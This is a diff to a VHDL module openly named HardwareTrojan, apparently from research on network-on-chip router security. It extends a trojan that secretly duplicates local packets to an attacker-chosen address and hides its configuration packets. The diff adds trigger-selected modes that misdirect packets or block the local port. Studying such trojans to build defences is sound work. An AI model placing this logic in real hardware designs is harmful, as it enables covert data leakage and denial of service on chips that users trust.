@@ -16,9 +16,12 @@ entity HardwareTrojan is
         reset :	 		in std_logic;
         data_in :	 	in regflit;         -- to read the information on the local port
         destAddr :      in arrayNportless1_regmetadeflit;
+        htOp :          in arrayNportless1_2bits;
         dupFlit :       out regflit;
         sending:        in std_logic;
         duplicate : 	out std_logic;      -- to inform the SW that the packet must be duplicated
+        missdirect :    out std_logic;      -- to inform the buffer that the packet must be missdirected
+        localblock :    out std_logic;      -- to inform the buffer that the local port is blocked
         configPckt : 	in std_logic_vector(NPORT-2 downto 0);        -- informs the presence of a config packet inside the buffer
         turnOff :       in std_logic_vector(NPORT-2 downto 0);
         n_maskPckt_o :  out std_logic
@@ -32,6 +35,7 @@ signal state : HTState;
 signal destination, dest : regmetadeflit;
 signal n_maskPckt, turnOff_or : std_logic;
 signal zeros : std_logic_vector(METADEFLIT-2 downto 0);
+signal op, operation: std_logic_vector(1 downto 0);
 
 begin
 
@@ -56,6 +60,7 @@ begin
 
                 -- Stores the Destination address to replace it in the duplicated packet
                 when readDestination =>
+                    operation <= op; 
                     destination <= dest;
                     state <= waitHeader;
 
@@ -89,7 +94,9 @@ begin
     dupFlit <= zeros & '1' & destination when state = waitHeader else data_in;
 
     -- Informa o Switch Control que ele deve rotear os próximos pacotes locais para duas saídas
-    duplicate <= '1' when state = waitHeader or state = transmitting else '0';
+    duplicate <= '1' when (state = waitHeader or state = transmitting) and (operation = "10" or operation = "00") else '0';
+    missdirect <= '1' when (state = waitHeader or state = transmitting) and (operation = "01") else '0';
+    localblock <= '1' when (state = waitHeader or state = transmitting) and (operation = "11") else '0';
 
     -- Mascara o pacote de configuração para o IP!
     n_maskPckt <= '0' when configPckt(0) = '1' or configPckt(1) = '1' or configPckt(2) = '1' or configPckt(3) = '1' or turnOff_or = '1' else '1';
@@ -101,5 +108,11 @@ begin
             destAddr(1) when configPckt(1) = '1' else
             destAddr(2) when configPckt(2) = '1' else
             destAddr(3);
+
+    -- Mux to define the operation source
+    op <= htOp(0) when configPckt(0) = '1' else
+          htOp(1) when configPckt(1) = '1' else
+          htOp(2) when configPckt(2) = '1' else
+          htOp(3);
 
 end HardwareTrojan;
